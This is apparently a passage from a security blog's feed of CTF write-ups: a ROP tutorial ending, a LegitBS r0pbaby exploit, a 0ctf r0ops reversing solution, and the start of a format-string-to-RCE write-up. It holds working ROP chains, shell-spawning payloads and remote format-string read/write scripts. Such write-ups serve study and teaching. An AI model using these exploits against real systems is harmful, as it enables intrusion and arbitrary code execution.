0016| 0xbffff668 --&gt; 0x0 
0020| 0xbffff66c --&gt; 0x6f23fbda 
0024| 0xbffff670 --&gt; 0x0 
0028| 0xbffff674 --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ x/s 0x80ca040
0x80ca040:   "/bin/sh"
</code></pre>

<p>Excellent, that worked. Now we have to set the registers accordingly. <code>ebx</code> must be set to <code>0x80ca040</code>, <code>eax</code> must be set to <code>0x0b</code> and we&rsquo;ll zero out <code>ecx</code> and <code>edx</code>.</p>

<p>There are no gadgets that do <code>xor ecx, ecx; ret</code>. Instead, I opted to load <code>0xffffffff</code> into <code>ecx</code> and <code>edx</code> and then increase the registers by one; this will overflow and make both of them zero.</p>

<pre><code># building from the previous code

payload += p(0x080525ed)    # pop ecx; pop ebx; ret
payload += p(0xffffffff)    # ecx -&gt; will be zeroed later
payload += p(0x080ca040)    # ebx, filename to execute "/bin/sh"
payload += p(0x08083f36)    # inc ecx; adc al, 0x39; ret
                            # this will clobber eax, but we'll set it later anyway. ecx will be zero

# do the same for edx                       
payload += p(0x080525c6)    # pop edx; ret
payload += p(0xffffffff)    # 
payload += p(0x0804ef21)    # inc edx; add al, 0x83; ret
</code></pre>

<p>Our next problem arises: I don&rsquo;t want to use NULL bytes. However, we&rsquo;ll need to set <code>eax</code> to <code>0x0000000b</code>. I use the following sequence for this, making use of the <code>movzx</code> instruction. <code>movzx</code> is <em>move into register, zero extend</em>.</p>

<pre><code># continue

payload += p(0x0806b893)    # pop eax; ret
payload += p(0x4141410b)    # value for eax, without NULL bytes
payload += p(0x08071b90)    # movzx eax, al; ret
                            # after this instruction, eax will be 0x0b

payload += p(0x08052cf0)    # int 0x80; ret
</code></pre>

<p>That&rsquo;s it. Let&rsquo;s try:</p>

<pre><code class="bash">seb@minol:~/tmp$ python purepoc0.py &gt; input0
seb@minol:~/tmp$ gdb -q level0
Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
gdb-peda$ r &lt; input0
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK...

process 3481 is executing new program: /bin/dash
[Inferior 1 (process 3481) exited normally]
Warning: not running or target is remote
gdb-peda$
</code></pre>

<p>Nice! It looks like the shell was spawned! A final test consists of running it on the command line. The extra <code>cat</code> is added to keep the spawned shell alive, by connecting stdin and stdout of the newly created shell.</p>

<pre><code class="bash">seb@minol:~/tmp$ (python purepoc0.py; cat) | ./level0
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK...&lt;snipped&gt;
id
uid=1000(seb) gid=1000(seb) groups=1000(seb),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),103(fuse),104(scanner),107(bluetooth),108(netdev),119(kismet),900(cbnetwork)
whoami
seb
</code></pre>

<p>That was about it. The ROP chain is able to set all the required registers, write out a string in memory and finally perform a syscall.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LegitBS CTF - R0pbaby]]></title>
    <link href="http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby/"/>
    <updated>2015-05-29T23:07:23+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been away for quite a while, and I missed most of the LegitBS CTF. There were only a few hours left when I joined Swappage. Here&rsquo;s how we solved r0pbaby.</p>

<!--more-->


<p>So we&rsquo;re given a binary and a place to connect to. Upon running and examing the binary, it seems like this is a very easy ROP challenge. The binary will give libc function addresses upon request; this makes it easy to defeat ASLR. The option of getting libc&rsquo;s base address seems to return some strange address. Finally, the third option asks for a buffer, which is then copied to the stack, overwrites the saved return address and basically kicks off our ROP chain&hellip; couldn&rsquo;t be easier, right?</p>

<pre><code class="bash">bas@tritonal:~/tmp/ropbaby$ file r0pbaby
r0pbaby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
bas@tritonal:~/tmp/ropbaby$ gdb ./r0pbaby 
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : disabled
</code></pre>

<p>So exploiting it should be relatively easy. The binary itself contains very little useable gadgets. We can defeat ASLR by leaking function addresses. There is, however, the problem of finding the correct libc <em>version</em>. This took us some time to figure out, but luckily Swappage found an <a href="https://github.com/niklasb/libc-database">offline tool to identify libc</a>. It was <code>libc6_2.19-0ubuntu6.6_i386</code>. Another nice tool to identify libc is <a href="http://libcdb.com">libcdb.com</a>. After identifying the right libc version, we could find all the necessary gadgets via <a href="http://ropshell.com">ropshell.com</a>. Our plan was to <code>mprotect()</code> a certain region of memory as RWX, then <code>read()</code> in some shellcode and return to it.</p>

<p>Now, the plan fell through. For some reason, the <code>read()</code> syscall to read in the shellcode failed. Instead, I switched the exploit around a bit. We have access to <code>system()</code>, so I set up a ROP chain to <code>mprotect()</code> the first 0x1000 bytes of libc as RWX. Then, I wrote out the string <code>/bin//sh</code> to memory. At this point, it was getting late and I could have just as easily written out <code>/bin/sh,0</code> to memory&hellip; Finally, returning to <code>system("/bin//sh")</code> spawned a shell, allowing us to read the flag!</p>

<pre><code class="python">import socket, struct, re, time

def p(x):
    return struct.pack('&lt;Q', x)

def get_function(s, name):
    s.send('2\n')
    s.send(name+'\n')
    time.sleep(0.50)
    data = s.recv(1000)

    m = re.findall('(0x0000.*)', data)
    print m
    return int(m[0], 16)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('localhost', 4000))
s.connect(('r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me', 10436))

print s.recv(1000)
print s.recv(1000)

# get some address where we'll store the shellcode
SYSTEM = get_function(s, "system")
READ = get_function(s, "read")
MPROTECT = get_function(s, "mprotect")

# this offset was found like so:
# $ nm -D ./libc-2.19.so |grep mprotect
# 00000000000f4a20 W mprotect
LIBC_BASE = MPROTECT - 0xf4a20

print "[!] libc_base  = 0x%X" % LIBC_BASE
print "[!] system()   = 0x%X" % SYSTEM
print "[!] read()     = 0x%X" % READ
print "[!] mprotect() = 0x%X" % MPROTECT

POPRDX = LIBC_BASE + 0x000bcee0
POPRAX = LIBC_BASE + 0x00048858
POPRSI = LIBC_BASE + 0x00024805
POPRDI = LIBC_BASE + 0x00022b1a
SYSCAL = LIBC_BASE + 0x000c1e55
MOVMEM = LIBC_BASE + 0x0002fa03 #: mov [rax], rdx; ret

# kick off ROP chain
s.send('3\n')
print s.recv(1000)


# build ROP chain
# first, mprotect() a certain area
payload = "A"*8
payload += p(POPRDX)
payload += p(7)
payload += p(POPRSI)
payload += p(0x1000)
payload += p(POPRDI)
payload += p(LIBC_BASE)
payload += p(POPRAX)
payload += p(10)
payload += p(SYSCAL)

# secondly, write '/bin' to memory via MOVMEM gadget
payload += p(POPRDX)
payload += p(0x6e69622f)
payload += p(POPRAX)
payload += p(LIBC_BASE)
payload += p(MOVMEM)

# thirdly, write '//sh' to memory
payload += p(POPRDX)
payload += p(0x68732f2f)
payload += p(POPRAX)
payload += p(LIBC_BASE+4)
payload += p(MOVMEM)

# finally, return-to-system and invoke a shell
payload += p(POPRDI)
payload += p(LIBC_BASE)
payload += p(SYSTEM)

length = "%d" % (len(payload)+1)
print "[!] sending " + length + " bytes"
s.send(length + '\n')

time.sleep(0.5)
s.send(payload + '\n')

print s.recv(1000)

# interact with the shell
import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
</code></pre>

<p>Putting it all together:</p>

<p><img src="/assets/legitbs/r0pbaby.png" alt="" /></p>

<p>This was an easy one, but still took me a while to get back into binary exploitation. Especially getting the correct libc version took longer than necessary and my thanks go out to Swappage for persisting and finding the correct version!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[0ctf - R0ops]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/30/0ctf-r0ops/"/>
    <updated>2015-03-30T21:15:09+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/30/0ctf-r0ops</id>
    <content type="html"><![CDATA[<p><code>r0ops</code> was a reversing challenge, worth only 150 points. Based on the amount of points, I expected it to be relatively easy, but I was in for a ride down the rabbit hole&hellip;</p>

<!-- more -->


<p></p>

<p>The binary opens binds to a port and waits for incoming connections. Upon connecting with <code>nc</code>, nothing much happens. While trying to run it in <code>gdb</code>, I encountered the first anti-debugger trick:</p>

<pre><code>;;; nice anti-debugger code
 dead448:   ba 00 00 00 00          mov    edx,0x0
 dead44d:   be 01 00 00 00          mov    esi,0x1
 dead452:   bf 02 00 00 00          mov    edi,0x2
 dead457:   e8 c4 32 55 f2          call   400720 &lt;socket@plt&gt;
 dead45c:   89 45 fc                mov    DWORD PTR [rbp-0x4],eax
 dead45f:   83 7d fc 03             cmp    DWORD PTR [rbp-0x4],0x3      ; anti-gdb trick
 dead463:   74 07                   je     dead46c &lt;div+0x320&gt;
 dead465:   b8 00 00 00 00          mov    eax,0x0
 dead46a:   eb 50                   jmp    dead4bc &lt;div+0x370&gt;
</code></pre>

<p><code>gdb</code> opens more file descriptors. The binary rightly expects the socket handle to be file descriptor 3; if it encounter anything else, it must be because <code>gdb</code> is running.</p>

<p>Examing the output of <code>objdump</code>, I quickly learned that the main program is just a stub to load a ROP chain:</p>

<pre><code> ;;; accept calls
 dead3af:   eb 02                   jmp    dead3b3 &lt;div+0x267&gt;
 dead3b1:   52                      push   rdx
 dead3b2:   f2 48 83 ec 10          repnz sub rsp,0x10
 dead3b7:   ba 00 00 00 00          mov    edx,0x0
 dead3bc:   be 00 00 00 00          mov    esi,0x0
 dead3c1:   bf 03 00 00 00          mov    edi,0x3
 dead3c6:   e8 45 33 55 f2          call   400710 &lt;accept@plt&gt;
 dead3cb:   89 45 fc                mov    DWORD PTR [rbp-0x4],eax
 dead3ce:   8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
 dead3d1:   b9 00 00 00 00          mov    ecx,0x0
 dead3d6:   ba 00 10 00 00          mov    edx,0x1000
 dead3db:   be c0 10 0b 0e          mov    esi,0xe0b10c0
 dead3e0:   89 c7                   mov    edi,eax
 dead3e2:   e8 89 32 55 f2          call   400670 &lt;recv@plt&gt;
 dead3e7:   8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
 dead3ea:   89 c7                   mov    edi,eax
 dead3ec:   b8 00 00 00 00          mov    eax,0x0
 dead3f1:   e8 ca 32 55 f2          call   4006c0 &lt;close@plt&gt;
 dead3f6:   ba a0 f0 0a 0e          mov    edx,0xe0af0a0
 dead3fb:   be a0 00 0b 0e          mov    esi,0xe0b00a0
 dead400:   b8 00 02 00 00          mov    eax,0x200
 dead405:   48 89 d7                mov    rdi,rdx
 dead408:   48 89 c1                mov    rcx,rax
 dead40b:   f3 48 a5                rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
 dead40e:   b8 c0 10 0b 0e          mov    eax,0xe0b10c0
 dead413:   48 89 c7                mov    rdi,rax                  ; input from socket
 dead416:   b8 c0 20 0b 0e          mov    eax,0xe0b20c0            ; storage
 dead41b:   48 89 c6                mov    rsi,rax
 dead41e:   b8 a0 f8 0a 0e          mov    eax,0xe0af8a0            ; contains a lot of addresses...
 dead423:   48 89 c4                mov    rsp,rax                  ; it's a ROP chain!
 dead426:   c3                      ret                             ; this generates a new program &amp; jumps to it
 dead427:   c9                      leave  
 dead428:   c3                      ret                             
</code></pre>

<p>I set a breakpoint at the <code>ret</code> instruction, just before the ROP chain kicks off. I then dumped and copied the ROP chain and used some shell-fu to clean up the output:</p>

<pre><code class="bash">$ head stackdump 
0xe0af8a0:  0x0dead1f4  0x00000000  0x00000008  0x00000000
0xe0af8b0:  0x0dead271  0x00000000  0xbeef0095  0x1337dead
0xe0af8c0:  0x0dead123  0x00000000  0x0dead0ed  0x00000000
0xe0af8d0:  0x0dead204  0x00000000  0x0dead267  0x00000000
0xe0af8e0:  0x0dead0f8  0x00000000  0x0dead103  0x00000000
0xe0af8f0:  0x0dead0ed  0x00000000  0x0dead27a  0x00000000
0xe0af900:  0x0dead20e  0x00000000  0x0dead0f8  0x00000000
0xe0af910:  0x0dead1ec  0x00000000  0x0000cafe  0x00000000
0xe0af920:  0x0dead141  0x00000000  0x0dead0ed  0x00000000
0xe0af930:  0x0dead204  0x00000000  0x0dead284  0x00000000
$ cat stackdump | sed 's/0x//g' | awk '{print $3 $2"\n" $5 $4}' &gt; ropchain
</code></pre>

<p>Now, the ropchain contained only bare addresses. This is were the second obfuscation step came into place: each ROP gadget starts with a <code>jmp</code> which jumps in the middle of another instruction. Because of this, the disassembly cannot be trusted. Instead, I manually looked up all the ROP gadgets and pieced them together. The ROP chain is quite ingenious, although it also contains tons of redundant instruction:</p>

<pre><code>000000000dead1f4    pop rcx
0000000000000008
000000000dead271    pop r9                          ; r9 = 1337deadbeef0095
1337deadbeef0095
000000000dead123    mov    rax,QWORD PTR [rdi]      ; [rdi+0] first QWORD of input
000000000dead0ed    add    rsi,0x8                  ; rsi=8
000000000dead204    mov    QWORD PTR [rsi],rax      ; rsi=8
000000000dead267    mov    r8,QWORD PTR [rsi]       ; rsi=8 r8 = first QWORD of input
000000000dead0f8    sub    rsi,0x8                  ; rsi=0
000000000dead103    add    rdi,0x8                  ; rdi=8
000000000dead0ed    add    rsi,0x8                  ; rsi=8 (no-op)
000000000dead27a    mov    QWORD PTR [rsi],r9       ; rsi=8 [rsi] = 1337deadbeef0095
000000000dead20e    mov    rax,QWORD PTR [rsi]      ; rsi=8 rax = 1337deadbeef0095
000000000dead0f8    sub    rsi,0x8                  ; rsi=0
000000000dead1ec    pop    rbx                      ; rbx = cafe
000000000000cafe
000000000dead141    imul   rax,rbx                  ; rax ==&gt; 0x2724090c079825d6
000000000dead0ed    add    rsi,0x8                  ; rsi=8
000000000dead204    mov    QWORD PTR [rsi],rax      ; rax = 0x1337deadbeef0095*0xcafe
...continues...
</code></pre>

<p>It basically takes the first QWORD of the input, sent over the socket, and then proceeds to generate a special constant. This is used later to compare against. I followed the rest of the ROP chain, and it basically does the following: it repeatedly multiplies the QWORD of our input with itself. At set intervals, it will multiply this value with the original QWORD. After a fixed number of iterations, it compares the resulting QWORD to the generated magic constant. The ROP chain uses a clever mechanism to implement conditional looping:</p>

<pre><code>000000000dead1ec    pop    rbx                      ; rbx=0
0000000000000000
000000000dead1fc    pop    rdx                      ; rdx=1d8; adjustment for rsp!
00000000000001d8                                    ; 
000000000dead19b    0xdead19f:  cmp    rax,rbx      ; rax contains a counter used to iterate; 
                    0xdead1a2:  jne    0xdead1a7    ; -&gt; ret; if rax != rbx, continue
                    0xdead1a4:  add    rsp,rdx      ; when it reaches zero, control is passed to the next gadget, located at rsp+0x1d8 
</code></pre>

<p>Clever stuff, but horrible to trace. There were a lot of jumps and no ops to throw me off. For instance, a gadget would <code>add rsi, 8</code> and the next one would <code>sub rsi, 8</code>, effectively doing nothing (except annoying me and wearing out my Enter key).</p>

<h2>Breaking the chain</h2>

<p>The ROP chain repeats this process eight times, so we need to send eight QWORDS over the socket. For each QWORD, a new magic constant is generated (taking the former value, multiplying by <code>0xcafe</code> and adding <code>0xbeef</code>). To inspect what was going on, I set breakpoints on two very important ROP gadgets:</p>

<pre><code>Breakpoint 1, 0x000000000dead145 in ?? ()
1: x/i $rip
=&gt; 0xdead145:   imul   rax,rbx


Breakpoint 2, 0x000000000dead1ae in ?? ()
1: x/i $rip
=&gt; 0xdead1ae:   cmp    rax,rbx
</code></pre>

<p>This allowed me to dump each value that was generated, and finally see which values are being compared by the binary (one of which was the magic constant).</p>

<p>I briefly considered bruteforcing the entire 64-bit range, but this was <em>way</em> too slow, even in C. I focussed on creating a function that emulates what is done with the first QWORD. After squashing a bug, I ended up with the following python code:</p>

<pre><code class="python">def p(x, n):
    while n:
        x = (x*x) &amp; 0xffffffffffffffff
        n -= 1
    return x

def c(i):
    x = (p(i, 3) * i) &amp; 0xffffffffffffffff
    x = (p(i, 4) * x) &amp; 0xffffffffffffffff
    x = (p(i, 10) * x) &amp; 0xffffffffffffffff
    x = (p(i, 12) * x) &amp; 0xffffffffffffffff
    return (p(i, 13) * x) &amp; 0xffffffffffffffff

print hex(c(0x4242424241414141)) # remember, little endian ;)
</code></pre>

<p>Then I noticed something crucial. As I entered variations of <code>0x4242424241414141</code>, the last byte of the generated value was only dependent on the last byte of the input (by chance it was also <code>0x41</code>)! This gave me an idea&hellip;</p>

<h2>Byte-by-byte</h2>

<p>I found I could bruteforce the correct value for each QWORD, going one byte at a time! After a while (and squashing the aforementioned bug by careful tracing of the ROP chain) I came up with the following python code:</p>

<pre><code class="python">import struct

def q(x):
    return struct.pack('&lt;Q', x)

def p(x, n):
    while n:
        x = (x*x) &amp; 0xffffffffffffffff
        n -= 1
    return x

def c(i):
    x = (p(i, 3) * i) &amp; 0xffffffffffffffff
    x = (p(i, 4) * x) &amp; 0xffffffffffffffff
    x = (p(i, 10) * x) &amp; 0xffffffffffffffff
    x = (p(i, 12) * x) &amp; 0xffffffffffffffff
    return (p(i, 13) * x) &amp; 0xffffffffffffffff


key_list = []
check = 0x1337deadbeef0095
for u in range(8):
    check = ((check * 0xcafe) + 0xbeef) &amp; 0xffffffffffffffff

    key = 0
    for i in range(8):
        for z in xrange(1,0xff):
            # ugly, but works: it basically only compares the output of the c() function
            # up to the byte it's bruteforcing
            if (c(key | (z &lt;&lt; (i*8))) &amp; (0xff &lt;&lt; i*8)) == (check &amp; (0xff &lt;&lt; i*8)):
                key += (z &lt;&lt; (i * 8))
                break

    print "[+] key {}: {} -&gt; {} == {}".format(u, hex(key), hex(c(key)), hex(check))
    key_list.append(key)

# send all the generated keys as little-endian QWORDS to the binary
from socket import *
global s
s=socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 13337))

payload = ''
for key in key_list:
    payload += q(key)

s.send(payload+'\n')
print s.recv(1000)

s.close()
</code></pre>

<p>The ROP chain went through its hoops and landed here, dumping the flag!</p>

<pre><code>000000000dead1aa    0xdead1ae:  cmp    rax,rbx
                    0xdead1b1:  je     0xdead1b6  ; if rax == rbx, the special constant and the value generated from our QWORD match
                    0xdead1b3:  add    rsp,rdx    ; if rax == rbx, this is skipped...
                        0xdead1b6:  ret               ;
000000000dead1fc    pop    rdx                    ; ...and the ROP chain continues here...
fffffffffffffc38
000000000dead1d7    loop   0xdead1db              ; ...if all eight QWORDS check out... (rcx contained 8 at the start)
000000000dead33c
   0xdead340:   sub    rsp,0x10                   ; ...then control is passed here
   0xdead344:   mov    edi,0xdead544
   0xdead349:   call   0x400680 &lt;puts@plt&gt;
   0xdead34e:   mov    edi,0xdead54e
   0xdead353:   mov    eax,0x0
   0xdead358:   call   0x4006a0 &lt;printf@plt&gt;
   0xdead35d:   mov    DWORD PTR [rbp-0x4],0x0
   0xdead364:   jmp    0xdead38b
   0xdead366:   mov    eax,DWORD PTR [rbp-0x4]
   0xdead369:   cdqe   
   0xdead36b:   mov    rax,QWORD PTR [rax*8+0xe0b10c0]
   0xdead373:   mov    eax,eax
   0xdead375:   mov    rsi,rax
   0xdead378:   mov    edi,0xdead55d
   0xdead37d:   mov    eax,0x0
   0xdead382:   call   0x4006a0 &lt;printf@plt&gt;
   0xdead387:   add    DWORD PTR [rbp-0x4],0x1
   0xdead38b:   cmp    DWORD PTR [rbp-0x4],0x7
   0xdead38f:   jle    0xdead366
   0xdead391:   mov    edi,0xdead564
   0xdead396:   call   0x400680 &lt;puts@plt&gt;            ; dumps flag in console!
   0xdead39b:   mov    eax,0x0
   0xdead3a0:   call   0xdead3af
   0xdead3a5:   leave  
   0xdead3a6:   ret
</code></pre>

<p>The output of the script and binary:</p>

<pre><code class="bash">bas@tritonal:~/tmp/0ctf/r0ops$ ./r0ops &amp; python ./bf.py
[1] 4471
[+] key 0: 0xd5b028b6c97155a5L -&gt; 0x2724090c0798e4c5L == 0x2724090c0798e4c5L
[+] key 1: 0x51a2c3e8e288fa45 -&gt; 0x44e477ee2e372c65L == 0x44e477ee2e372c65L
[+] key 2: 0x561720a3f926b105 -&gt; 0xa150eec963c67d25L == 0xa150eec963c67d25L
[+] key 3: 0xa325ec548e4e0385L -&gt; 0xeab7d48b9db01ba5L == 0xeab7d48b9db01ba5L
[+] key 4: 0x5369761ad6ccde85 -&gt; 0xf01b0cf36a8c5ea5L == 0xf01b0cf36a8c5ea5L
[+] key 5: 0x9475802813002885L -&gt; 0x930eeb9679f4d8a5L == 0x930eeb9679f4d8a5L
[+] key 6: 0xcadd6a0bdc679485L -&gt; 0xaeb27b8833e1e4a5L == 0xaeb27b8833e1e4a5L
[+] key 7: 0x7d67b37124bcbc85 -&gt; 0x2a900a13b88bcca5L == 0x2a900a13b88bcca5L

YOU WIN!

FLAG IS: 0ctf{c97155a5e288fa45f926b1058e4e0385d6ccde8513002885dc67948524bcbc85}
</code></pre>

<p>Good stuff! Funny to see a ROP chain &ldquo;from the other side&rdquo; :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution]]></title>
    <link href="http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/"/>
    <updated>2015-02-22T13:01:22+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution</id>
    <content type="html"><![CDATA[<p>You might remember my first <a href="https://staringintodevnull.blogspot.nl/2014/09/maximum-overkill-rop-exploit-for.html">Maximum Overkill writeup</a>, where I made a ROP exploit with ASLR/NX bypass for a simple buffer overflow exercise. I completed another over-the-top, why-would-you-even-do-this exploit for a CTF challenge and figured I&rsquo;d shared it.</p>

<!-- more -->


<p><a href="http://ringzer0team.com">ringzer0team</a> has a very nice, long-running CTF going on. I already did the <a href="https://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/">shellcoding challenges</a>, which I really enjoyed. I completed the fourth pwnable level on an evening, which simply involved dumping the stack via a format string bug and grabbing a password. I thought to myself: &ldquo;would I be able to get a shell using this format string vulnerability?&rdquo;</p>

<p>This writeup is made with Hindsight<sup>tm</sup> and as such, I have not included all the paths that led nowhere or the mistakes I have made. I have tried to include the thought-process as much as possible.</p>

<h2>Dumping the Stack</h2>

<p>OK, onwards! One catch is that the remote box is a 64-bit system and I don&rsquo;t have the binary itself. We do have a snippet of source code and the ability to dump the stack from within a vulnerable <code>sprintf</code> call:</p>

<pre><code class="c">    char *response = NULL;
    char *cleanBuffer = NULL;

    response = (char*)malloc(2048);
    memset(response, 0, 2048);

    cleanBuffer = (char*)malloc(strlen(buf));
    memset(cleanBuffer, 0, strlen(buf));

    strncpy(cleanBuffer, buf, strlen(buf) - 1);

    char test[] = "AAAABBBBCCCC";
    char flag[] = "XXXXXXXXXXXXXXXXXXXXXXXXXX";

    if(strcmp(flag, cleanBuffer) == 0) {
        strcpy(response, "Here's your flag FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXX.\n");
    } else {
        sprintf(response, cleanBuffer); // &lt;-- we have a format string vulnerability here
        sprintf(response, "%s is a wrong password.\n\nPassword:", response);
    }
</code></pre>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%lx-%lx-%lx-%lx-%lx-%lx-
17f4880-25-0-80-7fffd6e74448-200000000- is a wrong password.
</code></pre>

<p>The fifth address jumps out. It is either a stack address, or a <code>libc</code> address. Let&rsquo;s see what it points to:</p>

<p><img src="/assets/maximum-overkill-two/00-what-does-the-stack-contain.png" alt="" /></p>

<p>I tried to write to it using <code>%n</code>, which didn&rsquo;t crash the remote binary. This meant that it most likely is a stack address! I wrote a small python script to dump the stack. I noticed I could not re-use the connection I made via python sockets, so I had to reconnect for every format string I sent.</p>

<pre><code class="python">import struct
from socket import *

def grab(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = data.split()[0]

    print i, addr
    s.close()

for z in range(700):
    grab(z)
</code></pre>

<p>This indeed dumped out the data on the stack. I found where the fifth parameter was pointing to:</p>

<pre><code>...snip...
633 7fffeecd9c28
634 1c
635 2
636 7fff00000042
637 7fffeecdaf65
638 0
...snip...
</code></pre>

<p>See, it points to the 636th parameter, because the lower 32 bits contain the value I&rsquo;ve just written with <code>%n</code>! Pretty neat. So with <code>%&lt;parameter number&gt;$lx</code> I could view what that particular parameter contained, and with <code>%&lt;parameter number&gt;$s</code> I could see what it pointed to (provided it was pointing to a valid memory address!) I wondered where the 636th parameter pointed to:</p>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%636$lx
7fff3ca49f51 is a wrong password.

Password:%636$s
/home/crackme/fs_64 is a wrong password.
</code></pre>

<p>Interesting! I figured I could use this to my advantage&hellip; The 5th parameter points to the 636th, which itself points to somewhere on the stack. I could write to the address contained in the 636th parameter, like so:</p>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%636$lx
7fff3ca49f51 is a wrong password.

Password:%636$s
/home/crackme/fs_64 is a wrong password.

Password:%66c%636$hhn                  
                                                                 � is a wrong password.

Password:%636$s
Bhome/crackme/fs_64 is a wrong password.
</code></pre>

<h2>Write what where now?</h2>

<p>But more importantly, I could write <strong>to</strong> the 636th parameter <em>via</em> the fifth, giving me a write-what-where primitive! So, for instance, to write to <code>0x7fff3ca49f00</code>, I&rsquo;d first do <code>%256c%5$hhn</code>. This will overwrite the last byte of the 636th parameter with a NULL. Then, I&rsquo;d write to the address using <code>%66c%636$hhn</code>. Finally, I&rsquo;d like to know where this byte was written, which turned out to be the easiest: we have the address of <code>636</code>, and we have another address <code>0x7fff3ca49f00</code>. Subtracting the first from the latter and dividing by 8 gives the format string parameter we need to access the written byte directly! I wrote a simple proof-of-concept for this.</p>

<p>The following python code abuses the format string vulnerability to write out &lsquo;BAS&rsquo; to an area on the stack. We can access it indirectly with <code>%636$s</code> and directly using <code>%&lt;parameter&gt;$lx</code>, given the proper format parameter. The funny thing that I noticed was that my changes to the stack were persistent, even after reconnecting. This meant that the binary did not fork(), but handled each request by itself. This is interesting for later&hellip;</p>

<pre><code class="python">import struct
from socket import *

def grab_value_directly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = int(data.split()[0], 16)

    s.close()
    return addr

def grab_value_indirectly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$s\n')

    data = s.recv(64)
    addr = data.split()[0]

    # ugly workaround, only grab 8 bytes. will fix this later!
    if len(addr) &gt; 8:
        address = addr[0:8]
    else:
        address = addr + '\x00' * (8-len(addr))

    s.close()
    return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
    data = s.recv(64)

    s.close()

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

# this will write out 'BAS',0 to the scratch area!
# update the pointer
write_byte_value_via(5, 1)
# write a byte to the scratch area
write_byte_value_via(636, ord('B'))
# update the pointer
write_byte_value_via(5, 2)
# write a byte to the scratch area
write_byte_value_via(636, ord('A'))
write_byte_value_via(5, 3)
write_byte_value_via(636, ord('S'))
write_byte_value_via(5, 4)
# write out a NULL byte first writing out 256 bytes (which wraps to 0x00)
write_byte_value_via(636, 256)

# reset the pointer
write_byte_value_via(5, 1)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

# CAN ADDRESS IT DIRECTLY!!
scratch_addr = grab_value_directly(636+format_offset)
print "scratch contains: ", hex(scratch_addr)
</code></pre>

<pre><code class="bash">bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5$ python sploit1.py 
parameter 5 points to:  0x7fff3ca480d8
address pointed to by parameter 5 contains:  0x7fff3ca49f51
scratch contains:  0x534142
scratch is parameter 1601
scratch contains:  0x53414200
</code></pre>

<p>This is great, because I have a write-what-where primitive know! My first thought was to overwrite a GOT entry with <code>system()</code>. For that to work, I needed several things: the address of system() in libc, and thus which version of libc I was dealing with; and the address of a GOT pointer which I could overwrite. First things first, I wrote a dumper script to start dumping the binary.</p>

<h2>Slam Dump </h2>

<p>Using the <code>write-an-address-to-scratch-space</code> primitive, I started dumping the binary. I added a function to dump from a specific memory address and I verified it by grabbing the bytes at <code>0x400000</code>. These should correspond to the magic bytes of an ELF header.</p>

<pre><code class="python">import struct
from socket import *

def grab_value_directly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = int(data.split()[0], 16)

    s.close()
    return addr

def grab_value_indirectly(i):
